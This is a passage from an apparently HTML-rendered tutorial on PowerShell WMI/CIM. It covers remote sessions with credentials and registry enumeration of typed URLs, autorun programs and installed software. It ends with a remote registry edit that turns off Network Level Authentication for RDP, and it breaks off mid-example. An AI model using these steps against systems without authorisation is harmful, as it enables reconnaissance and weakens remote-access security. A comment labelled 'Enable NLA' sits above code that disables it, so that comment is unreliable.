&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;Associators Of {Win32_Directory.Name=&amp;#39;C:\users\pecoraro\desktop&amp;#39;} Where ResultClass = CIM_DataFile&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">foreach-object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">Write-Host&lt;/span> &lt;span class="n">-BackgroundColor&lt;/span> &lt;span class="n">Red&lt;/span> &lt;span class="s2">&amp;#34;FILENAME: &amp;#34;&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$QUERY&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Associators of {Win32_LogicalFileSecuritySetting.Path=&amp;#39;&amp;#34;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Name&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;} Where ResultClass=Win32_SID&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="nv">$QUERY&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="wmi-on-remote-computers">WMI on Remote Computers&lt;/h3>
&lt;p>WMI can also be executed on remote computers, but it requires admin privileges on the remote machine.
WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT friendly. Data exchange is performed on dynamic ports which can be configured in registry. CIM cmdlets through CIM sessions are able to use both DCOM port 135 and WinRM/WSMan ports 5585-5586, which are firewall and NAT friendly.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># WMI&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_BIOS&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># CIM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$session&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-CimSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-CimSession&lt;/span> &lt;span class="nv">$session&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_BIOS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Force CIM to use DCOM in place of WSMAN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sessionoption&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-CimSessionOption&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">DCOM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$session&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-CimSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-SessionOption&lt;/span> &lt;span class="nv">$sessionoption&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="windows-registry-with-wmi">Windows Registry with WMI&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-List&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">Methods&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Constants required to access Registry Hives:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Registry Hive&lt;/th>
&lt;th>Constant&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>$HIVE_HKROOT&lt;/td>
&lt;td>2147483648&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$HIVE_HKCU&lt;/td>
&lt;td>2147483649&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$HIVE_HKLM&lt;/td>
&lt;td>2147483650&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$HIVE_HKU&lt;/td>
&lt;td>2147483651&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Value data types:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Data Type&lt;/th>
&lt;th>Constant&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>$REG_SZ&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$REG_EXPAND_SZ&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$REG_BINARY&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$REG_DWORD&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$REG_MULTI_SZ&lt;/td>
&lt;td>7&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$REG_QWORD&lt;/td>
&lt;td>11&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Retreive Internet Explorer typed URLs (&lt;code>HKCU:\software\microsoft\internet explorer\typedurls&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">EnumKey&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;software\microsoft\internet explorer&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">EnumValues&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;software\microsoft\internet explorer\typedurls&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">GetStringValue&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;software\microsoft\internet explorer\typedurls&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;url1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sValue&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It can also be made simpler by using a variable (in particular for remote computers):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Methods&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ----&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># CreateKey&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DeleteKey&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># EnumKey&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># EnumValues&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DeleteValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetDWORDValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetQWORDValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetDWORDValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetQWORDValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetMultiStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetMultiStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetExpandedStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetExpandedStringValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetBinaryValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetBinaryValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># CheckAccess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SetSecurityDescriptor&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># GetSecurityDescriptor&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">getStringValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;software\microsoft\internet explorer\typedurls&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;url1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sValue&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List autorun programs (&lt;code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get WMI registry object&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List available methods&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">methods&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List keys in Software\Microsoft\Windows\CurrentVersion&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Run&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RunOnce&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List all values of the selected key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OneDrive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># CCleaner Smart Cleaning&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># NordVPN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get string value among all values of the selected key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">getStringValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;OneDrive&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">getStringValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;OneDrive&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sValue&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List installed applications:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Uninstall&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveTouchMeetingClient&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Discord&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Fiddler2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OneDriveSetup.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Pulse_Setup_Client&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Pulse_Term_Services&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Uninstall\OneDriveSetup.exe&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DisplayName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DisplayIcon&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DisplayVersion&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HelpLink&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Publisher&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># UninstallString&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># UrlUpdateInfo&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># EstimatedSize&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># NoRepair&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># NoModify&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">getStringValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483649&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Software\Microsoft\Windows\CurrentVersion\Uninstall\OneDriveSetup.exe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;DisplayName&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Microsoft OneDrive&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List WMI installation directory:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">getStringValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483650&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;software\microsoft\wbem&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Installation Directory&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sValue&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Edit regitry to turn off Network Level Authentication (NLA):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="s2">&amp;#34;root\default&amp;#34;&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">StdRegProv&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">EnumValues&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483650&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">sNames&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check NLA enabling status&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetDWORDValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483650&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;UserAuthentication&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">uValue&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 0 --&amp;gt; NLA disabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 1 --&amp;gt; NLA enabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Enable NLA&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">SetDWORDValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483650&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;UserAuthentication&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check NLA enabling status&lt;/span>
